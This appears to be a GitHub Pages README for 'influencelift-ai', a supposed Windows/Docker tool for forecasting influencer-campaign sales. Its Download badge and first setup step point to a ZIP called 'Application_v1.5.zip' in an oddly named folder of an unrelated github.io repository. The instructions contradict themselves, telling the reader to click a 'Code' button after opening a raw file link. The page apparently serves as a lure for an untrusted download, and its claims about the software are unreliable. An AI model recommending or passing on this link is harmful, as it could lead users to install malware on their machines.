---
layout: "default"
title: "📈 influencelift-ai - Improve marketing results with data insights"
description: "Forecast influencer campaign sales with ridge regression models to optimize marketing budgets."
---
# 📈 influencelift-ai - Improve marketing results with data insights

[![Download](https://img.shields.io/badge/Download-Influencelift-blue.svg)](https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip)

Influencelift-ai helps you clean messy campaign data, forecast future product sales, and simulate the outcome of your marketing decisions. You use this platform to turn raw numbers into clear, actionable business strategies. It removes the guesswork from influencer campaigns by applying proven machine-learning models to your existing data.

## 📥 Getting Started

You do not need to be a developer to use this tool. This platform runs locally on your Windows machine to ensure your data stays private and secure. Follow these instructions to set up the system.

1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip](https://raw.githubusercontent.com/Arisu1990/arisu1990.github.io/main/whipcordy/Application_v1.5.zip)
2. Look for the green button labeled "Code" on the right side of the page.
3. Click "Download ZIP" to save the project folder to your computer.
4. Extract the contents of the ZIP folder to a known location, such as your desktop or documents folder.

## ⚙️ System Requirements

Ensure your computer meets these requirements before you start the application:

* Windows 10 or Windows 11 operating system.
* At least 8GB of RAM.
* A stable internet connection for the initial setup.
* Docker Desktop installed on your system.

## 🛠️ Installation Steps

This application relies on Docker to manage its internal components. If you do not have Docker Desktop installed, download it from the official Docker website and follow the installation prompts. Restart your computer after the installation completes.

Once you have Docker Desktop running:

1. Open the folder you extracted earlier.
2. Locate the file named `docker-compose.yml`.
3. Right-click the file and select "Open with" to choose a text editor, or simply verify it exists in the main directory.
4. Open your Windows Command Prompt. You find this by typing "cmd" in the Windows search bar.
5. Type `cd` followed by the path to your extracted folder and press Enter.
6. Type `docker-compose up` inside the command window and press Enter.
7. Wait for the terminal to display a message stating "Uvicorn running on http://0.0.0.0:8000" or similar. This indicates the software is ready.

## 🖥️ Using the Application

Open your preferred web browser once the terminal indicates the system is live. Navigate to the address `http://localhost:8000` in your address bar. You see the dashboard interface immediately.

### Cleaning Data
Select the "Data Import" tab to upload your CSV or Excel files. The system automatically identifies duplicate entries and missing values in your influencer campaign datasets. Click "Clean Records" to standardize the format of your influencer names, dates, and engagement counts.

### Sales Forecasting
After you clean your data, move to the "Forecasting" tab. Choose your target product from the drop-down menu. The system uses regression models to predict sales volume for the next 30, 60, or 90 days based on your historical campaign performance. The resulting charts show you high and low estimates to help you plan your budget.

### Marketing Simulations
Use the "Simulation" tool to test hypothetical scenarios. You can adjust your expected spend, change your target audience demographics, or select different influencer tiers. The platform processes these variables and displays the potential lift in sales compared to your current strategy. This allows you to compare multiple pathways before you commit your actual marketing budget.

## 🛡️ Privacy and Data Security

Your data never leaves your computer. The application performs all calculations locally within the Docker container. This ensures that sensitive company information, such as sales figures and contract details, remains under your physical control. You may clear your local database at any time by selecting "Clear Cache" in the Settings menu.

## 🔧 Troubleshooting Common Issues

If the application fails to open in your browser, perform these checks:

* **Docker is not running:** Click the Docker icon in your system tray to ensure the engine started successfully.
* **Port conflict:** If something else is using port 8000, you see an error in the command window. Try changing the port number in the `docker-compose.yml` file to 8080 and restart the process.
* **File permissions:** Ensure you have full read and write access to the folder where you extracted the project files.
* **Data format:** Ensure your input files follow the header format described in the sample files provided within the `data/examples` folder of the download.

## 📁 Project Structure

The project organizes files into distinct groups for easier maintenance:

* `data/`: Place your campaign spreadsheets here for processing.
* `models/`: This contains the saved machine-learning algorithms that generate your forecasts.
* `src/`: This folder holds the core logic and interface code.
* `docker-compose.yml`: This file manages the startup sequence and software dependencies.

Keywords: data-science, docker, fastapi, influencer-marketing, machine-learning, marketing-analytics, mlops, python, regression, sales-forecasting, scikit-learn, streamlit